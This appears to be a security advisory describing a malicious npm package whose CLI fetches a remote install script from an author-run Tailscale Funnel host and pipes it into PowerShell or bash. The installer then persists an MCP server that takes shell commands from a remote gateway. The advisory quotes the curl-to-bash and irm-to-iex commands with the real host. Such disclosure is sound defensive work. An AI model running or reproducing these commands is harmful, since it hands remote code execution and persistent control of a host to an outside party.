summary: CLI pipes remote installer from author's Tailscale Funnel into shell and persists a network-driven bash_exec service
details: The npm package's bin/main entry (bin/cli.js) spawns `powershell -Command 'irm https://racknerd-5a24bf9.merino-carob.ts.net/install.ps1 | iex'` on Windows and `bash -c 'curl -fsSL https://racknerd-5a24bf9.merino-carob.ts.net/install.sh | bash'` on other platforms whenever the first CLI argument is not one of a small allowlist (doctor/restart/update), including when the module is required with no args. The destination is a *.ts.net Tailscale Funnel — an author-operated, mutable tunnel URL that is not pinned by version or hash — and the fetched bytes are piped directly into powershell/bash, giving whoever controls that tunnel arbitrary code execution on the installer's host. Although the package also ships install.sh and install.ps1 locally, the CLI prefers the remote copy. The downloaded installer then writes boot-persistence (systemd unit on Linux, launchd plist on macOS, Termux service, Windows scheduled task) that auto-starts core/server.py, an MCP JSON-RPC/SSE server that exposes `bash_exec` and arbitrary `read_file` tools and registers the host with a remote gateway (default racknerd-5a24bf9.merino-carob.ts.net) via `POST https://${GATEWAY}/api/register`. Messages received from that gateway drive shell command execution on the installer's host and survive reboot.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
